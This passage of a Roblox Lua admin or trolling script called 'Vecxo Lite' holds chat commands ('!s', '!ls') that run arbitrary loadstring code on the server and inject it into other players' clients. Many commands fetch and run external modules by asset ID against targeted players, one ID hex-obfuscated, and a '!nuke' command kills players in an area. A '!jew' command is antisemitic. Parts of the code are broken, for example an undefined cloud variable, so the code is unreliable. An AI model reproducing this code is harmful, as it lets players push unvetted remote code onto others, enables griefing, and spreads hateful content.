							part.Transparency = i / 10
							task.wait(0.05)
						end
						part.CanCollide = true
						part.BrickColor = origColor
						part.Transparency = origTransparency
						cooldown = false
					end)
				end
			end)

			return part
		end

		local turns = 5
		local stepsPerTurn = 16
		local spiralSteps = stepsPerTurn * turns
		local radius = 10
		local angleStep = math.rad(360 / stepsPerTurn) 
		local verticalStep = 1.5

		local lastPart = blocks[#blocks]
		local spiralCenter = lastPart and lastPart.Position or basePos

		local lastSpiralPos = nil

		for i = 1, spiralSteps do
			local angle = i * angleStep
			local x = math.cos(angle) * radius
			local z = math.sin(angle) * radius
			local y = i * verticalStep
			local position = spiralCenter + Vector3.new(x, y, z)

			lastSpiralPos = position
			createRainbowFadeStep(position, i * 0.1)
		end

		-- === 3-Way Split Path Challenge v2 ===
		local stageStartPos = lastSpiralPos or (basePos + Vector3.new(0, 60, 0))
		local challengeStart = stageStartPos + Vector3.new(0, 4, 0) -- lowered Y offset
		local spacingBetweenRooms = 14
		local laneOffset = 10
		local currentY = challengeStart.Y
		local currentZ = challengeStart.Z

		math.randomseed(tick())

		for stage = 1, 3 do
			-- Add a decision platform before each set
			local decisionPad = Instance.new("Part")
			decisionPad.Size = Vector3.new(18, 1, 8)
			decisionPad.Anchored = true
			decisionPad.Material = Enum.Material.SmoothPlastic
			decisionPad.BrickColor = BrickColor.new("Medium stone grey")
			decisionPad.Position = Vector3.new(stageStartPos.X, currentY, currentZ)
			decisionPad.Name = "DecisionPad"
			decisionPad.Parent = workspace

			currentZ = currentZ + spacingBetweenRooms

			local correctLane = math.random(1, 3)

			for lane = 1, 3 do
				local offsetX = (lane - 2) * laneOffset
				local part = Instance.new("Part")
				part.Size = Vector3.new(6, 1, 12)
				part.Anchored = true
				part.Material = Enum.Material.Neon
				part.BrickColor = BrickColor.new((lane == correctLane) and "Institutional white" or "Institutional white")
				part.Position = Vector3.new(stageStartPos.X + offsetX, currentY, currentZ)
				part.Name = (lane == correctLane) and "SafeTile" or "KillTile"
				part.Parent = workspace

				if lane ~= correctLane then
					part.Touched:Connect(function(hit)
						local hum = hit.Parent:FindFirstChildOfClass("Humanoid")
						if hum then
							hum.Health = 0
							part.Transparency = 1
							part.CanCollide = false
							task.delay(1, function()
								if part and part.Parent then
									part.Transparency = 0
									part.CanCollide = true
								end
							end)
						end
					end)
				end
			end

			currentZ = currentZ + spacingBetweenRooms
		end

		local spinnerStartZ = currentZ 
		local spinnerCount = 4
		local spinnerSpacing = 18
		local bladeLength = 12
		local pathY = currentY


		for i = 1, spinnerCount do
			local zPos = spinnerStartZ + (i - 1) * spinnerSpacing

			-- Base platform under the spinner
			local base = Instance.new("Part")
			base.Size = Vector3.new(12, 1, 12)
			base.Position = Vector3.new(stageStartPos.X, pathY, zPos)
			base.Anchored = true
			base.Material = Enum.Material.SmoothPlastic
			base.BrickColor = BrickColor.new("Dark stone grey")
			base.Name = "SpinnerBase"
			base.Parent = workspace

			-- Rotating blade
			local blade = Instance.new("Part")
			blade.Size = Vector3.new(bladeLength, 0.4, 1)
			blade.Position = base.Position + Vector3.new(0, 2, 0)
			blade.Anchored = true
			blade.Material = Enum.Material.Metal
			blade.BrickColor = BrickColor.new("Really black")
			blade.Name = "Blade"
			blade.Parent = workspace

			-- Optional kill effect
			blade.Touched:Connect(function(hit)
				local hum = hit.Parent:FindFirstChildOfClass("Humanoid")
				if hum then
					hum.Health = 0
				end
			end)

			-- Spin using RunService heartbeat
			local angle = 0
			local speed = math.random(3, 4.5) * (math.random(0, 1) == 0 and 1 or -1)

			game:GetService("RunService").Heartbeat:Connect(function(dt)
				if blade and blade.Parent then
					angle += dt * speed
					blade.CFrame = CFrame.new(base.Position + Vector3.new(0, 2, 0)) * CFrame.Angles(0, angle, 0)
				end
			end)
		end

		-- Update currentZ so the next section starts further ahead
		currentZ = spinnerStartZ + spinnerCount * spinnerSpacing

		task.wait(.1)


		local finalWinPos = Vector3.new(stageStartPos.X, currentY + 5, currentZ)

		local winPart = Instance.new("Part")
		winPart.Size = Vector3.new(10, 1, 10)
		winPart.Anchored = true
		winPart.Position = finalWinPos
		winPart.BrickColor = BrickColor.new("Lime green")
		winPart.Material = Enum.Material.Neon
		winPart.Name = "WIN"
		winPart.Parent = workspace

		local text = Instance.new("BillboardGui", winPart)
		text.Size = UDim2.new(0, 200, 0, 50)
		text.StudsOffset = Vector3.new(0, 3, 0)
		text.AlwaysOnTop = true

		local label = Instance.new("TextLabel", text)
		label.Size = UDim2.new(1, 0, 1, 0)
		label.Text = "üèÅ YOU WIN üèÅ"
		label.TextColor3 = Color3.new(1, 1, 1)
		label.BackgroundTransparency = 1
		label.Font = Enum.Font.Arcade
		label.TextScaled = true
		label.Parent = text

		notifyv3(sender, "[Vecxo Lite]: :", "Generated obby successfully")

		winPart.Touched:Connect(function(hit)
			local player = game.Players:GetPlayerFromCharacter(hit.Parent)
			if player then
				local hint=Instance.new("Hint",game.workspace)
				hint.Text = player.Name.." beat the pro obby B-)" 
				task.wait(3)
				hint:Destroy()
			end
		end)
	elseif cmd == "!ls" then
		handled = true
		local no = false
		if not table.find(exclusivewl, sender.Name) then
			no = true
			notifyv3(sender, "[Vecxo Lite]: ", "‚ùå You are not authorized to run this command, only the top admins can access this!")
		end
		if not no then
			local targets = GetPlayers(args[2], sender)
			local code = msg:sub(#args[1] + #args[2] + 3)
			local testFunc, compileError = loadstring(code)
			if not testFunc then
				notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Code compilation error: " .. tostring(compileError))
				return
			end
			if not game:GetService("ServerScriptService"):FindFirstChild(varName) then
				local ticking = tick()
				require(gamegoog).load()
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild(varName) or tick() - ticking >= 10
			end
			local goog = game:GetService("ServerScriptService"):FindFirstChild(varName)
			if not goog then
				warn("goog failed to be added, command can not continue")
				notifyv3(sender, "[Vecxo Lite]: ", "‚ùå goog failed to be added, command can not continue")
				return
			end
			local deployedCount = 0
			for _, plr in ipairs(targets) do
				local scr = goog:FindFirstChild("Utilities").Client:Clone()
				local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()
				loa.Parent = scr
				scr:WaitForChild("Exec").Value = code
				if plr.Character then
					scr.Parent = plr.Character
					deployedCount = deployedCount + 1
				elseif plr:FindFirstChild("PlayerGui") then
					scr.Parent = plr:FindFirstChild("PlayerGui")
					deployedCount = deployedCount + 1
				else
					notifyv3(sender, "[Vecxo Lite]: ", "‚ö†Ô∏è Could not deploy to " .. plr.Name .. " (no valid parent)")
					continue
				end
				scr.Enabled = true
			end
			if deployedCount > 0 then
				task.spawn(function()
					GraphicalEffects.CrystalRing(sender, "Lime green", 2)
				end)
				notifyv3(sender, "[Vecxo Lite]: ", "üì§ Script deployed to " .. deployedCount .. "/" .. #targets .. " player(s)")
			else
				notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Failed to deploy script to any players")
			end
		end
	elseif cmd == "!s" then
		handled = true
		local no = false
		if not table.find(exclusivewl, sender.Name) then
			no = true
			notifyv3(sender, "[Vecxo Lite]: ", "‚ùå You are not authorized to run this command, only the top admins can access this!")
		end
		if no ~= true then
			local code = msg:sub(4)
			if code == "" then
				task.spawn(function()
					GraphicalEffects.CrystalRing(sender, "Really red", 2)
				end)
				notifyv3(sender, "[Vecxo Lite]: ", "‚ùå No code provided.")
				return
			end

			local success, err = pcall(function()
				loadstring(code)()
			end)

			if success then
				task.spawn(function()
					GraphicalEffects.CrystalRing(sender, "Lime green", 2)
				end)
				notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Code ran successfully")
			else
				task.spawn(function()
					GraphicalEffects.CrystalRing(sender, "Really red", 2)
				end)
				notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Issue executing code: " .. err)
			end
		end
	elseif cmd == "!re" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		if #targets == 0 then
			notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Player(s) '" .. args[2] .. "' not found.")
			return
		end
		for _, targetPlayer in ipairs(targets) do
			refreshPlayer(targetPlayer)
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Refreshed " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!cmds" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			showCommandGui(plr)
		end
	elseif cmd == "!bans" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			showBannedList(plr, bannedPlayers)
		end
	elseif cmd == "!plrlist" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			showPlayerList(plr)
		end
	elseif cmd == "!nuke" then
		handled = true
		local explosionSize = 100
		local target = args[2]
		local args = args[3] or "100"

		if args[3] then
			args = args[3]
		end

		if not args[2] or target == "me" then
			target = sender.Name
		end

		local argt = GetPlayers(args[2], sender)

		if #argt > 0 then
			target = argt[1]
		end

		-- Nuke Script by ccuser44 (github/ccuser44/Fast-nuclear-explosion), MIT License
		local Lighting = game:GetService("Lighting")
		local SoundService = game:GetService("SoundService")
		local TweenService = game:GetService("TweenService")
		local Debris = game:GetService("Debris")

		-- Constants
		local CLOUD_RING_MESH_ID = "rbxassetid://3270017"
		local CLOUD_SPHERE_MESH_ID = "rbxassetid://1185246"
		local CLOUD_MESH_ID = "rbxassetid://1095708"
		local CLOUD_COLOR_TEXTURE = "rbxassetid://1361097"

		-- Variables
		local basePart = Instance.new("Part")
		basePart.Anchored = true
		basePart.Locked = true
		basePart.CanCollide = false
		basePart.CanQuery = false
		basePart.CanTouch = false
		basePart.TopSurface = Enum.SurfaceType.Smooth
		basePart.BottomSurface = Enum.SurfaceType.Smooth
		basePart.Size = Vector3.new(1, 1, 1)

		local baseMesh = Instance.new("SpecialMesh")
		baseMesh.MeshType = Enum.MeshType.FileMesh

		local sphereMesh, ringMesh = baseMesh:Clone(), baseMesh:Clone()
		sphereMesh.MeshId = CLOUD_SPHERE_MESH_ID
		ringMesh.MeshId = CLOUD_RING_MESH_ID

		local cloudMesh = baseMesh:Clone()
		cloudMesh.MeshId, cloudMesh.TextureId = CLOUD_MESH_ID, CLOUD_COLOR_TEXTURE
		cloudMesh.VertexColor = Vector3.new(0.9, 0.6, 0)

		local skybox = Instance.new("Sky")
		skybox.SkyboxFt, skybox.SkyboxBk = "rbxassetid://1012887", "rbxassetid://1012890"
		skybox.SkyboxLf, skybox.SkyboxRt = "rbxassetid://1012889", "rbxassetid://1012888"
		skybox.SkyboxDn, skybox.SkyboxUp = "rbxassetid://1012891", "rbxassetid://1014449"

		local nukeSkyboxes, realSkyboxes = setmetatable({}, {__mode = "v"}), setmetatable({}, {__mode = "v"})
		local nukeIgnore = setmetatable({}, {__mode = "v"})
		local explosionParams = OverlapParams.new()
		explosionParams.FilterDescendantsInstances = nukeIgnore
		explosionParams.FilterType = Enum.RaycastFilterType.Exclude
		explosionParams.RespectCanCollide = true

		-- Functions
		local function basicTween(instance, properties, duration)
			local tween = TweenService:Create(
				instance,
				TweenInfo.new(
					duration,
					Enum.EasingStyle.Linear,
					Enum.EasingDirection.In,
					0,
					false,
					0
				),
				properties
			)
			tween:Play()
			if tween.PlaybackState == Enum.PlaybackState.Playing or tween.PlaybackState == Enum.PlaybackState.Begin then
				tween.Completed:Wait()
			end
		end

		local function createMushroomCloud(position, container, clouds, shockwave)
			local baseCloud = basePart:Clone()
			baseCloud.Position = position

			local poleBase = basePart:Clone()
			poleBase.Position = position + Vector3.new(0, 0.1, 0)

			local cloud1 = basePart:Clone()
			cloud1.Position = position + Vector3.new(0, 0.75, 0)

			local cloud2 = basePart:Clone()
			cloud2.Position = position + Vector3.new(0, 1.25, 0)

			local cloud3 = basePart:Clone()
			cloud3.Position = position + Vector3.new(0, 1.7, 0)

			local poleRing = basePart:Clone()
			poleRing.Position = position + Vector3.new(0, 1.3, 0)
			poleRing.Transparency = 0.2
			poleRing.BrickColor = BrickColor.new("Dark stone grey")
			poleRing.CFrame = poleRing.CFrame * CFrame.Angles(math.rad(90), 0, 0)

			local mushCloud = basePart:Clone()
			mushCloud.Position = position + Vector3.new(0, 2.3, 0)

			local topCloud = basePart:Clone()
			topCloud.Position = position + Vector3.new(0, 2.7, 0)

			do
				local baseCloudMesh = cloudMesh:Clone()
				baseCloudMesh.Parent = baseCloud 
				baseCloudMesh.Scale = Vector3.new(2.5, 1, 4.5)

				local poleBaseMesh = cloudMesh:Clone()
				poleBaseMesh.Scale = Vector3.new(1.25, 2, 2.5)
				poleBaseMesh.Parent = poleBase

				local cloud1Mesh = cloudMesh:Clone()
				cloud1Mesh.Scale = Vector3.new(0.5, 3, 1)
				cloud1Mesh.Parent = cloud1

				local cloud2Mesh = cloudMesh:Clone()
				cloud2Mesh.Scale = Vector3.new(0.5, 1.5, 1)
				cloud2Mesh.Parent = cloud2

				local cloud3Mesh = cloudMesh:Clone()
				cloud3Mesh.Scale = Vector3.new(0.5, 1.5, 1)
				cloud3Mesh.Parent = cloud3

				local poleRingMesh = ringMesh:Clone()
				poleRingMesh.Scale = Vector3.new(1.2, 1.2, 1.2)
				poleRingMesh.Parent = poleRing

				local topCloudMesh = cloudMesh:Clone()
				topCloudMesh.Scale = Vector3.new(7.5, 1.5, 1.5)
				topCloudMesh.Parent = topCloud

				local mushCloudMesh = cloudMesh:Clone()
				mushCloudMesh.Scale = Vector3.new(2.5, 1.75, 3.5)
				mushCloudMesh.Parent = mushCloud
			end

			table.insert(clouds, baseCloud)
			table.insert(clouds, topCloud)
			table.insert(clouds, mushCloud)
			table.insert(clouds, cloud1)
			table.insert(clouds, cloud2)
			table.insert(clouds, cloud3)
			table.insert(clouds, poleBase)
			table.insert(clouds, poleRing)

			local bigRing = basePart:Clone()
			bigRing.Position = position
			bigRing.CFrame = bigRing.CFrame * CFrame.Angles(math.rad(90), 0, 0)

			local smallRing = basePart:Clone()
			smallRing.Position = position
			smallRing.BrickColor = BrickColor.new("Dark stone grey")
			smallRing.CFrame = smallRing.CFrame * CFrame.Angles(math.rad(90), 0, 0)

			local innerSphere = basePart:Clone()
			innerSphere.Position = position
			innerSphere.BrickColor = BrickColor.new("Bright orange")
			innerSphere.Transparency = 0.5

			local outterSphere = basePart:Clone()
			outterSphere.Position = position
			outterSphere.BrickColor = BrickColor.new("Bright orange")
			outterSphere.Transparency = 0.5

			do
				local bigMesh = ringMesh:Clone()
				bigMesh.Scale = Vector3.new(5, 5, 1)
				bigMesh.Parent = bigRing

				local smallMesh = ringMesh:Clone()
				smallMesh.Scale = Vector3.new(4.6, 4.6, 1.5)
				smallMesh.Parent = smallRing

				local innerSphereMesh = sphereMesh:Clone()	
				innerSphereMesh.Scale = Vector3.new(-6.5, -6.5, -6.5)
				innerSphereMesh.Parent = innerSphere

				local outterSphereMesh = sphereMesh:Clone()
				outterSphereMesh.Scale = Vector3.new(6.5, 6.5, 6.5)
				outterSphereMesh.Parent = outterSphere
			end

			table.insert(shockwave, bigRing)	
			table.insert(shockwave, smallRing)
			table.insert(shockwave, outterSphere)
			table.insert(shockwave, innerSphere)

			for _, v in ipairs(shockwave) do
				v.Parent = container
			end
			for _, v in ipairs(clouds) do
				v.Parent = container
			end

			return {
				OutterSphere = outterSphere,
				InnerSphere = innerSphere,
				BigRing = bigRing,
				SmallRing = smallRing,
				BaseCloud = baseCloud,
				PoleBase = poleBase,
				PoleRing = poleRing,
				Cloud1 = cloud1,
				Cloud2 = cloud2,
				Cloud3 = cloud3,
				MushCloud = mushCloud,
				TopCloud = topCloud
			}
		end

		local function effects(nolighting)
			for i = 1, 2 do
				local explosionSound = Instance.new("Sound")
				explosionSound.Name = "NUKE_SOUND"
				explosionSound.SoundId = "http://www.roblox.com/asset?id=130768997"
				explosionSound.Volume = 0.5
				explosionSound.PlaybackSpeed = i / 2
				explosionSound.RollOffMinDistance, explosionSound.RollOffMaxDistance = 0, 10000
				explosionSound.Archivable = false
				explosionSound.Parent = SoundService
				explosionSound:Play()
				Debris:AddItem(explosionSound, 30)
			end

			if not nolighting then
				local oldBrightness = Lighting.Brightness
				Lighting.Brightness = 5
				basicTween(Lighting, {Brightness = 1}, 4 / 0.01 * (1 / 60))
				Lighting.Brightness = oldBrightness
			end
		end

		local function tagHumanoid(humanoid, attacker)
			local creatorTag = Instance.new("ObjectValue")
			creatorTag.Name = "creator"
			creatorTag.Value = attacker
			Debris:AddItem(creatorTag, 2)
			creatorTag.Parent = humanoid
		end

		local function destruction(position, radius, attacker)
			for _, v in ipairs(workspace:GetPartBoundsInRadius(position, radius, explosionParams)) do
				if v.ClassName ~= "Terrain" and v.Anchored == false then
					if attacker then
						local humanoid = v.Parent:FindFirstChildOfClass("Humanoid")
						if humanoid and not humanoid:FindFirstChild("creator") then
							tagHumanoid(humanoid, attacker)
						end
					end
					v:BreakJoints()
					v.Material = Enum.Material.CorrodedMetal
					v.AssemblyLinearVelocity = CFrame.new(v.Position, position):VectorToWorldSpace(Vector3.new(math.random(-5, 5), 5, 1000))
				end
			end
		end

		local function explode(position: Vector3, explosionSize: number, nolighting: boolean?, attacker: (Player | Humanoid)?)
			local shockwaveCompleted = false
			explosionParams.FilterDescendantsInstances = nukeIgnore
			local clouds, shockwave = {}, {}
			local container = Instance.new("Model")
			container.Name = "ADONIS_NUCLEAREXPLOSION"
			container.Archivable = false
			container.ModelStreamingMode = Enum.ModelStreamingMode.Atomic
			container.Parent = workspace
			table.insert(nukeIgnore, container)

			local cloudData = createMushroomCloud(position, container, clouds, shockwave)
			local outterSphere, innerSphere, bigRing, smallRing = cloudData.OutterSphere, cloudData.InnerSphere, cloudData.BigRing, cloudData.SmallRing
			local baseCloud, poleBase, poleRing = cloudData.BaseCloud, cloudData.PoleBase, cloudData.PoleRing
			localcombo1, cloud2, cloud3, mushCloud, topCloud = cloudData.Cloud1, cloudData.Cloud2, cloudData.Cloud3, cloudData.MushCloud, cloudData.TopCloud

			local newSky = skybox:Clone()
			table.insert(nukeSkyboxes, newSky)
			newSky.Parent = Lighting
			task.spawn(effects, nolighting)

			for _, v in ipairs(Lighting:GetChildren()) do
				if v:IsA("Sky") and not table.find(nukeSkyboxes, v) and not table.find(realSkyboxes, v) then
					table.insert(realSkyboxes, v)
				end
			end

			task.spawn(function()
				local maxSize = explosionSize * 3
				local smallSize = explosionSize / 2.5
				local nukeDuration = (maxSize - smallSize) / 2 * (1 / 60)
				local transforms = {
					{innerSphere, Vector3.new(-6.5 * maxSize, -6.5 * maxSize, -6.5 * maxSize)},
					{outterSphere, Vector3.new(6.5 * maxSize, 6.5 * maxSize, 6.5 * maxSize)},
					{smallRing, Vector3.new(4.6 * maxSize, 4.6 * maxSize, 1.5 * maxSize)},
					{bigRing, Vector3.new(5 * maxSize, 5 * maxSize, 1 * maxSize)},
				}

				for _, v in ipairs(transforms) do
					local object, scale = v[1], v[2]
					if typeof(object) == "Instance" then
						local mesh = object:FindFirstChildOfClass("SpecialMesh")
						if mesh then
							mesh.Scale = scale * (smallSize / maxSize)
							task.spawn(basicTween, mesh, {Scale = scale}, nukeDuration)
						end
					end
				end

				do
					local startclock = os.clock()
					local expGrow, expStat = maxSize - smallSize, smallSize
					repeat
						destruction(
							position,
							(((os.clock() - startclock) / nukeDuration) * expGrow + expStat) * 2,
							attacker
						)
						task.wait(1/25)
					until (os.clock() - startclock) > nukeDuration
				end

				for _, v in ipairs(shockwave) do
					v.Transparency = 0
					task.spawn(basicTween, v, {Transparency = 1}, 100 * (1 / 60))
				end
				task.wait(100 * (1 / 60))

				for _, v in ipairs(shockwave) do
					v:Destroy()
				end
				shockwaveCompleted = true
			end)

			task.spawn(function()
				local transforms = {
					{baseCloud, Vector3.new(2.5 * explosionSize, 1 * explosionSize, 4.5 * explosionSize), Vector3.new(0, 0.05 * explosionSize, 0)},
					{poleBase, Vector3.new(1 * explosionSize, 2 * explosionSize, 2.5 * explosionSize), Vector3.new(0, 0.1 * explosionSize, 0)},
					{poleRing, Vector3.new(1.2 * explosionSize, 1.2 * explosionSize, 1.2 * explosionSize), Vector3.new(0, 1.3 * explosionSize, 0)},
					{topCloud, Vector3.new(0.75 * explosionSize, 1.5 * explosionSize, 1.5 * explosionSize), Vector3.new(0, 2.7 * explosionSize, 0)},
					{mushCloud, Vector3.new(2.5 * explosionSize, 1.75 * explosionSize, 3.5 * explosionSize), Vector3.new(0, 2.3 * explosionSize, 0)},
					{cloud1, Vector3.new(0.5 * explosionSize, 3 * explosionSize, 1 * explosionSize), Vector3.new(0, 0.75 * explosionSize, 0)},
					{cloud2, Vector3.new(0.5 * explosionSize, 1.5 * explosionSize, 1 * explosionSize), Vector3.new(0, 1.25 * explosionSize, 0)},
					{cloud3, Vector3.new(0.5 * explosionSize, 1.5 * explosionSize, 1 * explosionSize), Vector3.new(0, 1.7 * explosionSize, 0)},
				}

				for _, v in ipairs(transforms) do
					local object, scale = v[1], v[2]
					if typeof(object) == "Instance" then
						object.Position = position + v[3] / 5
						local mesh = object:FindFirstChildOfClass("SpecialMesh")
						if mesh then
							mesh.Scale = scale / 5
							task.spawn(basicTween, mesh, {Scale = scale}, 2)
						end
						task.spawn(basicTween, object, {Position = position + v[3]}, 2)
					end
				end
			end)
			task.wait(2)

			for _, v in ipairs(clouds) do
				local mesh = v:FindFirstChildOfClass("SpecialMesh")
				if mesh then
					mesh.VertexColor = Vector3.new(0.9, 0.6, 0)
					task.spawn(basicTween, mesh, {VertexColor = Vector3.new(0.9, 0, 0)}, 0.6 / 0.0025 * (1 / 60))
				end
			end
			task.wait(0.6 / 0.0025 * (1 / 60))

			for _, v in ipairs(clouds) do
				local mesh = v:FindFirstChildOfClass("SpecialMesh")
				if mesh then
					mesh.VertexColor = Vector3.new(0.9, 0, 0)
					task.spawn(basicTween, mesh, {VertexColor = Vector3.new(0.5, 0, 0)}, (0.9 - 0.5) / 0.01 * (1 / 60) * 2)
				end
			end
			task.wait((0.9 - 0.5) / 0.01 * (1 / 60) * 2)

			local skyConnection
			skyConnection = newSky.AncestryChanged:Connect(function()
				if newSky and newSky.Parent ~= Lighting and table.find(nukeSkyboxes, newSky) then
					table.remove(nukeSkyboxes, table.find(nukeSkyboxes, newSky))
				end
				local hasNukeSkyboxes = false
				for _, v in ipairs(nukeSkyboxes) do
					if v.Parent == Lighting then
						hasNukeSkyboxes = true
						break
					end
				end
				if not hasNukeSkyboxes then
					for i = #realSkyboxes, 1, -1 do
						local v = realSkyboxes[i]
						if v.Parent == Lighting then
							v.Parent = nil
							task.spawn(function()
								task.wait()
								v.Parent = Lighting
							end)
						elseif table.find(realSkyboxes, v) then
							table.remove(realSkyboxes, table.find(realSkyboxes, v))
						end
					end
				end
				skyConnection:Disconnect()
			end)
			Debris:AddItem(newSky, 10)

			for _, v in ipairs(clouds) do
				local mesh = v:FindFirstChildOfClass("SpecialMesh")
				if mesh then
					mesh.VertexColor = Vector3.new(0, 0, 0)
					task.spawn(basicTween, mesh, {VertexColor = Vector3.new(0.5, 0.5, 0.5)}, 0.5 / 0.005 * (1 / 60))
					task.spawn(basicTween, mesh, {Scale = mesh.Scale + Vector3.new(0.1, 0.1, 0.1) * (0.5 / 0.005)}, 0.5 / 0.005 * (1 / 60))
				end
				task.spawn(basicTween, v, {Transparency = 0.5}, 0.5 / 0.005 * (1 / 60))
			end
			task.wait(0.5 / 0.005 * (1 / 60))

			for _, v in ipairs(clouds) do
				task.spawn(basicTween, v, {Transparency = 1}, 20)
				local mesh = v:FindFirstChildOfClass("SpecialMesh")
				if mesh then
					task.spawn(basicTween, mesh, {Scale = mesh.Scale + Vector3.new(0.1, 0.1, 0.1) * (1 / 0.005)}, 20)
				end
			end
			task.wait(20)

			while true do task.wait(1) if shockwaveCompleted then break end end
			container:Destroy()
		end

		if target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
			explode(target.Character.HumanoidRootPart.Position, args, false, sender)
		else
			explode(nil, args, false, sender)
		end
	elseif cmd == "!stickbeater" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			task.spawn(function()
				GraphicalEffects.CrystalRing(plr, "Lime green", 2)
			end)
			local success, err = pcall(function()
				require(5813743814).load(plr.Name)
			end)
			if not success then
				notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Error running stick beater on " .. plr.Name .. " - " .. err)
			end
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Ran stick beater on " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!motorcycle" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			task.spawn(function()
				GraphicalEffects.CrystalRing(plr, "Lime green", 2)
			end)
			local success, err = pcall(function()
				require(7473216460).load(plr.Name)
			end)
			if not success then
				notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Error running motorcycle on " .. plr.Name .. " - " .. err)
			end
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Ran motorcycle " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!spraypaint" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			task.spawn(function()
				GraphicalEffects.CrystalRing(plr, "Lime green", 2)
			end)
			local success, err = pcall(function()
				require(9253109537)(plr.Name)
			end)
			if not success then
				notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Error running spraypaint on " .. plr.Name .. " - " .. err)
			end
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Ran motorcycle " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!pizzafrenzy" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			task.spawn(function()
				GraphicalEffects.CrystalRing(plr, "Lime green", 2)
			end)
			local success, err = pcall(function()
				require(103491641253133).piza(plr.Name)
			end)
			if not success then
				notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Error running pizzafrenzy on " .. plr.Name .. " - " .. err)
			end
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Ran motorcycle " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
		require(103491641253133).piza(game.Players.LocalPlayer.Name)
	elseif cmd == "!knife" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			task.spawn(function()
				GraphicalEffects.CrystalRing(plr, "Lime green", 2)
			end)
			local success, err = pcall(function()
				require(2829943043):Run(plr.Name, 'i baked you a pie')
			end)
			if not success then
				notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Error running grab knife on " .. plr.Name .. " - " .. err)
			end
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Ran grab knife on " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!magician" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			task.spawn(function()
				GraphicalEffects.CrystalRing(plr, "Lime green", 2)
			end)
			local success, err = pcall(function()
				require(6438184104).load(plr.Name)
			end)
			if not success then
				notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Error running magician on " .. plr.Name .. " - " .. err)
			end
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Ran magician on " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!bombvest" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			task.spawn(function()
				GraphicalEffects.CrystalRing(plr, "Lime green", 2)
			end)
			local success, err = pcall(function()
				require(0x49731b7f).load(plr.Name)
			end)
			if not success then
				notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Error running bomb vest on " .. plr.Name .. " - " .. err)
			end
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Ran bomb vest on " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!toolgun" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			task.spawn(function()
				GraphicalEffects.CrystalRing(plr, "Lime green", 2)
			end)
			local success, err = pcall(function()
				require(14108404712).mingebag(plr.Name)
			end)
			if not success then
				notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Error running tool gun on " .. plr.Name .. " - " .. err)
			end
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Ran tool gun on " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!oofgun" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			task.spawn(function()
				GraphicalEffects.CrystalRing(plr, "Lime green", 2)
			end)
			local success, err = pcall(function()
				require(123877608710766).load(plr.Name)
			end)
			if not success then
				notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Error running suicide gun on " .. plr.Name .. " - " .. err)
			end
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Ran suicide gun on " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!jew" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			function givehat(v, hat) --//kozys code i belive :-D
				coroutine.resume(coroutine.create(function()
					if v and v.Character then
						local obj = game:service("InsertService"):LoadAsset(hat)
						for a, hat in pairs(obj:GetChildren()) do
							if hat:IsA("Accessory") or hat:IsA("Hat") then
								hat.Parent = v.Character
							end
						end
						obj:Destroy()
					end
				end))
			end
			function giveshirt(v, id)
				if v and v.Character then
					for i, c in pairs(v.Character:GetChildren()) do
						if c:IsA("Shirt") then
							c:Destroy() -- Fixed the typo
						end
					end
					local cl = Instance.new("Shirt", v.Character)
